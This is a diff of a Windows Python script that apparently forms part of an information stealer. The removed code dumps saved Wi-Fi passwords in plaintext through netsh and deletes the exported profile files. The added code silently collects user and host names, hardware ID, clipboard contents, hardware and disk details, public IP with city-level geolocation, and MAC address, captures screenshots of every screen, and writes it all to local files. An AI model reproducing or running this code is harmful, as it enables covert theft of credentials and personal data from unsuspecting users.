@@ -1,55 +1,82 @@
-import subprocess
 import os
+import re
+import uuid
+import psutil
+import requests
+import win32api
+import wmi
 import socket
+import pyperclip
+from PIL import ImageGrab
 
 
-class WifiPasswords:
-    def __init__(self):
-        self.password_file = open("wifi.txt", "w", encoding="utf-8")
-        self.password_file.write(f"Password List for: {socket.gethostname()}, {socket.gethostbyname(socket.gethostname())}: \n")
-        self.password_file.close()
+def user():
+        display_name = win32api.GetUserNameEx(win32api.NameDisplay)
+        hostname = os.getenv('COMPUTERNAME')
+        username = os.getenv('USERNAME')
 
-        self.files = []
-        self.ssid = []
-        self.password = []
+        return f"\nDisplay Name: {display_name} \nHostname: {hostname} \nUsername: {username}"
+        
 
-        subprocess.run("netsh wlan export profile key=clear", capture_output=True).stdout.decode()
-        self.path = os.getcwd()
-
-    def get_files(self):
-        for file_name in os.listdir(self.path):
-            if file_name.startswith("Wi-Fi") and file_name.endswith(".xml"):
-                self.files.append(file_name)
-
-    def write(self):
-        with open("wifi.txt", "a", encoding="utf-8") as file:
-            written_ssid = set()
-            for i in self.files:
-                with open(i, "r") as f:
-                    for line in f.readlines():
-                        if "name" in line:
-                            stripped = line.strip()
-                            front = stripped[6:]
-                            back = front[:-7]
-                            if back not in written_ssid:
-                                self.ssid.append(back)
-                        if "keyMaterial" in line:
-                            stripped = line.strip()
-                            front = stripped[13:]
-                            back = front[:-14]
-                            if self.ssid and back and self.ssid[-1] not in written_ssid:
-                                written_ssid.add(self.ssid[-1])
-                                self.password.append(back)
-                                file.write(f"SSID: {self.ssid[-1]} Password: {self.password[-1]}\n")
-                try:
-                    os.remove(i)
-                except:
-                    pass
-
-    def run(self):
-        self.get_files()
-        self.write()
+def system():
+    try:
+        hwid = wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
+    except:
+        hwid = "Unknown"
+    
+    try:
+        clipboard = pyperclip.paste()
+    except:
+        clipboard = "Unknown"
+    
+    cpu = wmi.WMI().Win32_Processor()[0].Name
+    gpu = wmi.WMI().Win32_VideoController()[0].Name
+    ram = wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize#round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
+    ram = round(float(ram) / 1048576)
+    
+    return f"\nCPU: {cpu}\nGPU: {gpu}\nRAM: {ram}GB\nClipboard: {clipboard}\nHWID: {hwid}"
 
 
-#wifi = WifiPasswords()
-#wifi.run()
+def disk():
+    disks = ["\n", ("{:<10}" * 4).format("Disk", "Free", "Total", "Used%"), "\n"]
+    for i in psutil.disk_partitions(all=False):
+        if os.name == 'nt' and ('cdrom' in i.opts or i.fstype == ''):
+            continue
+        usage = psutil.disk_usage(i.mountpoint)
+        disks.append("{:<9} {:<9} {:<9} {:<9}\n".format(i.device, str(usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%"))
+    return "".join(disks)
+
+
+def network():
+    def location(ip):
+        try:
+            response = requests.get(f"http://ip-api.com/json/{ip}", headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
+            data = response.json()
+            return data["country"], data["regionName"], data["city"], data["zip"], data["as"]
+        except:
+            return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown"
+
+    try:
+        public_ip = requests.get("https://api.ipify.org").text
+    except:
+        pass
+    private_ip = socket.gethostbyname(socket.getfqdn())
+    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+    country, region, city, zip_code, isp = location(public_ip)
+    
+    return f"\nPublic IP: {public_ip}\nPrivate IP: {private_ip}\nMAC Address: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city}, {zip_code}\nISP: {isp}"
+
+def screenshot():
+    try:
+        img = ImageGrab.grab(all_screens=True)
+        img.save("screenshot.png")
+    except:
+        pass
+
+#print(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
+def save():
+    with open("system.txt", "w",encoding="utf-8") as f:
+        f.write(f"User data: {user()}\nSystem data: {system()}\nDisk data: {disk()}\nNetwork data: {network()}")
+    screenshot()
+        
+#save()
